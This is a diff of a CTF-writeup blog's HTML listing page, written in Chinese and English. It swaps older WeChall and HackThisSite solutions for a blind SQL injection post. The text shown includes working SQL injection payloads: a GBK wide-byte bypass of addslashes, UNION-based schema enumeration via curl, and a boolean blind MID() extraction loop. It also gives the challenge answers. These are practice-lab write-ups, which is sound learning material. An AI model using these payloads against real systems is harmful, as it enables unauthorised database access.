         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/HackThisSite/hackthissite-basic-01/" class="post-title-link" itemprop="url">HackThisSite - Basic Mission 1</a>
+          <a href="/wp/WeChall/wechall-blinded-by-the-light/" class="post-title-link" itemprop="url">WeChall - Blinded by the light</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1029,121 +1483,7 @@ password file...</p>
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-08 21:35:10" itemprop="dateCreated datePublished" datetime="2026-06-08T21:35:10+08:00">2026-06-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/HackThisSite/hackthissite-basic-01/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/HackThisSite/hackthissite-basic-01/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>This level is what we call "The Idiot Test", if you can't complete
-it, don't give up on learning all you can, but, don't go begging to
-someone else for the answer, thats one way to get you hated/made fun
-of.</p>
-<p>这一关被称为"白痴测试"，如果你无法完成，别放弃学习，但不要去求别人给你答案。</p>
-</blockquote>
-<p>页面上有一个密码输入框，需要找到密码才能过关。</p>
-<h3 id="solution">Solution</h3>
-<p>最基本的 web 安全入门：查看网页源代码。</p>
-<p>右键查看页面源代码（或 <code>Ctrl+U</code>），然后搜索
-<code>password</code>，会发现密码直接以 HTML
-注释的形式嵌入在源码中：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- the first few levels are extremely easy: password is 798ce5a6 --&gt;</span></span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">798ce5a6</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-addslashes/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-addslashes/" class="post-title-link" itemprop="url">WeChall - Addslashes</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-06-06 17:02:08" itemprop="dateCreated datePublished" datetime="2026-06-06T17:02:08+08:00">2026-06-06</time>
+      <time title="Created: 2026-06-10 12:00:00" itemprop="dateCreated datePublished" datetime="2026-06-10T12:00:00+08:00">2026-06-10</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1171,8 +1511,8 @@ of.</p>
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/WeChall/wechall-addslashes/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-addslashes/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-blinded-by-the-light/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-blinded-by-the-light/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -1187,281 +1527,17 @@ of.</p>
     
     <div class="post-body" itemprop="articleBody">
           <h3 id="challenge">Challenge</h3>
-<p>MySQL/Exploit 类，难度 5.44，909 人解出。源码可见，使用
-<code>addslashes()</code> 对用户输入转义，但数据库连接字符集设为
-GBK。目标：以 admin 身份登录。密码字段会被 <code>md5()</code>
-处理，无法注入。</p>
+<p>Boolean blind SQL injection. Extract a 32-character hex hash from the
+database using boolean-based blind techniques.</p>
 <h3 id="solution">Solution</h3>
-<p>经典宽字节注入（Wide Byte Injection）。</p>
-<p><code>addslashes()</code> 会在
-<code>'</code>、<code>"</code>、<code>\</code>、<code>NUL</code>
-前插入反斜杠 <code>\</code>（0x5c）。正常情况下这能防住简单的 SQL
-注入，但 GBK 编码下，<code>0x5c</code>
-是合法的多字节字符的第二字节。</p>
-<p>GBK 编码范围：首字节 <code>0x81-0xFE</code>，尾字节
-<code>0x40-0xFE</code>（不含 <code>0x7F</code>）。所以
-<code>0xBF 0x5C</code> 是一个合法的 GBK 字符「縗」。</p>
-<p>攻击流程：</p>
-<p>表单使用 GET 方法提交，按钮值为「注册」。先确认正常登录行为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b &#x27;WC=...&#x27; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/addslashes/index.php?username=test&amp;password=test&amp;login=login&#x27;</span><br><span class="line">You are logged in, but not as Admin.</span><br></pre></td></tr></table></figure>
-<p>直接注入单引号，被 <code>addslashes()</code> 拦截：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b &#x27;WC=...&#x27; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/addslashes/index.php?username=admin%27--+-&amp;password=x&amp;login=login&#x27;</span><br><span class="line">Wrong username/password.</span><br></pre></td></tr></table></figure>
-<p>用 <code>%bf</code> 前缀构造宽字节。<code>admin'</code> 经过
-<code>addslashes()</code> 变成 <code>admin\'</code>，即
-<code>admin%5c%27</code>。我们在前面加 <code>%bf</code>，使
-<code>%bf%5c</code> 被 GBK
-解码为一个字符，<code>%27</code>（单引号）就逃逸了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b &#x27;WC=...&#x27; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/addslashes/index.php?username=%bf%27+OR+1%3d1--+-&amp;password=x&amp;login=login&#x27;</span><br><span class="line">You are logged in, but not as Admin.</span><br></pre></td></tr></table></figure>
-<p><code>%bf%5c</code> 被 GBK 吃掉成为「縗」，后面的
-<code>' OR 1=1-- -</code> 被解释为 SQL，绕过了转义。但
-<code>OR 1=1</code> 只会返回表中第一条记录，不一定是 Admin。需要精确指定
-Admin 用户名，用 hex 编码避免单引号被转义：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b &#x27;WC=...&#x27; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/addslashes/index.php?username=%bf%27+OR+username%3d0x41646d696e+--+&amp;password=x&amp;login=login&#x27;</span><br><span class="line">You are logged in. congrats!</span><br></pre></td></tr></table></figure>
-<p><code>0x41646d696e</code> 是 <code>'Admin'</code> 的 hex
-编码，不包含单引号，不会被 <code>addslashes()</code> 干扰。</p>
-<p>核心原理图示：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入:    &#x27; OR username=0x41646d696e -- -</span><br><span class="line">转义:    \&#x27; OR username=0x41646d696e -- -</span><br><span class="line">GBK 解: [縗]&#x27; OR username=0x41646d696e -- -    ← 反斜杠被吞，单引号逃逸</span><br><span class="line">SQL:     WHERE user=&#x27;[縗]&#x27; OR username=0x41646d696e -- -&#x27;</span><br><span class="line">         → 匹配 Admin 用户，密码条件被注释掉</span><br></pre></td></tr></table></figure>
-<p><code>OR 1=1</code>
-虽然能绕过密码检查，但只返回第一条记录。实际解题需要
-<code>OR username=0x41646d696e</code> 精确匹配 Admin。密码字段会被
-<code>md5()</code> 处理后再拼接，无法通过用户名注入绕过，所以必须用
-<code>--</code> 注释掉密码条件。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-table-names/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-table-names/" class="post-title-link" itemprop="url">WeChall - Table Names</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-06-06 16:46:13" itemprop="dateCreated datePublished" datetime="2026-06-06T16:46:13+08:00">2026-06-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-09 10:47:51" itemprop="dateModified" datetime="2026-09-09T10:47:51+08:00">2026-09-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-table-names/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-table-names/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>MySQL + Exploit, difficulty 4.79. 找出 SQL
-注入漏洞所用的数据库名和表名。无源码，有测试账号 test/test。</p>
-<p>答案格式: <code>databasename_tablename</code></p>
-<h3 id="solution">Solution</h3>
-<p>漏洞脚本是一个 GET 方法的登录表单，username 和 password 参数都存在
-SQL 注入。</p>
-<p>先用测试账号登录，确认正常响应：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl -G --data-urlencode &quot;username=test&quot; --data-urlencode &quot;password=test&quot; --data-urlencode &quot;login=login&quot; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/table_names/challenge.php&#x27;</span><br><span class="line">Welcome back test</span><br><span class="line">Your personal welcome message is: This is a demo account, nothing here.</span><br></pre></td></tr></table></figure>
-<p>用户名和密码字段都可以注入。布尔盲注验证：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -G --data-urlencode &quot;username=test&#x27; OR &#x27;1&#x27;=&#x27;1&quot; --data-urlencode &quot;password=x&quot; --data-urlencode &quot;login=login&quot; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/table_names/challenge.php&#x27;</span><br><span class="line">Welcome back Aaron A. Aaronson</span><br></pre></td></tr></table></figure>
-<p>确认注入点后，用 UNION SELECT 探测列数。正常登录显示用户名和 welcome
-message 两个字段，猜测 2-3 列。逐一测试发现 3 列时 welcome message
-位置返回了 UNION 的值：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -G --data-urlencode &quot;username=nosuchuser&#x27; UNION SELECT 1,1,1-- -&quot; --data-urlencode &quot;password=x&quot; --data-urlencode &quot;login=login&quot; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/table_names/challenge.php&#x27;</span><br><span class="line">... message is: 1 ...</span><br></pre></td></tr></table></figure>
-<p>第 3 列对应 welcome message 显示位置。提取数据库名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -G --data-urlencode &quot;username=nosuchuser&#x27; UNION SELECT 1,1,database()-- -&quot; ...</span><br><span class="line">message is: gizmore_tableu61</span><br></pre></td></tr></table></figure>
-<p>用 <code>hex()</code>
-确认：<code>67697A6D6F72655F7461626C65753631</code> →
-<code>gizmore_tableu61</code>。</p>
-<p>枚举该数据库下的表：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -G --data-urlencode &quot;username=nosuchuser&#x27; UNION SELECT 1,1,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)-- -&quot; ...</span><br><span class="line">message is: aaawrong</span><br><span class="line"></span><br><span class="line">$ curl -G --data-urlencode &quot;username=nosuchuser&#x27; UNION SELECT 1,1,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)-- -&quot; ...</span><br><span class="line">message is: usertableus4</span><br></pre></td></tr></table></figure>
-<p>两个表：<code>aaawrong</code>（陷阱）和
-<code>usertableus4</code>（用户表）。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">gizmore_tableu61_usertableus4</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-cgx-03-binary-encoding/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-cgx-03-binary-encoding/" class="post-title-link" itemprop="url">WeChall - CGX#3 - Binary Encoding</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-06-06 16:40:08" itemprop="dateCreated datePublished" datetime="2026-06-06T16:40:08+08:00">2026-06-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-cgx-03-binary-encoding/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-cgx-03-binary-encoding/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>The page shows a random 8-bit binary string and asks for its decimal
-equivalent:</p>
-<blockquote>
-<p>Please convert this binary data to a decimal number. 01100101</p>
-</blockquote>
-<p>The number is randomly generated and bound to your session.</p>
-<h3 id="solution">Solution</h3>
-<p>Convert with Python or JavaScript:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="string">&#x27;01100101&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">101</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">parseInt</span>(<span class="string">&#x27;01100101&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">101</span></span><br></pre></td></tr></table></figure>
-<p>Manual: each bit position is a power of 2, from right (2^0) to left
-(2^7). <code>01100101</code> = 64+32+4+1 = 101.</p>
-<p>Since the challenge is session-bound, you'll see a different number
-each visit — the method stays the same.</p>
+<p>源码审计确认 boolean blind SQLi。hash 是 32 位十六进制字符（0-9,
+A-F），共 16 种可能。每位用 4 次二分查询（16→8→4→2→1），32 位共 128
+次。</p>
+<p>核心注入 payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MID(password,&#123;pos&#125;,<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">&#x27;&#123;char&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>根据页面返回 True/False 判断字符范围，二分搜索确定每个字符。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">    lo, hi = <span class="number">0</span>, <span class="number">15</span></span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># inject: MID(password,N,1) &gt; HEX[mid]</span></span><br><span class="line">        <span class="keyword">if</span> response_true:</span><br><span class="line">            lo = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hi = mid</span><br><span class="line">    result += alphabet[lo]</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">9DF0D5E04DC51E5A17A667DBD1C9EBEA</span></span>
 
       
     </div>
@@ -1481,7 +1557,7 @@ each visit — the method stays the same.</p>
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/13/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><span class="space">&hellip;</span><a class="page-number" href="/page/41/">41</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/15/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/13/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><span class="space">&hellip;</span><a class="page-number" href="/page/54/">54</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/15/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
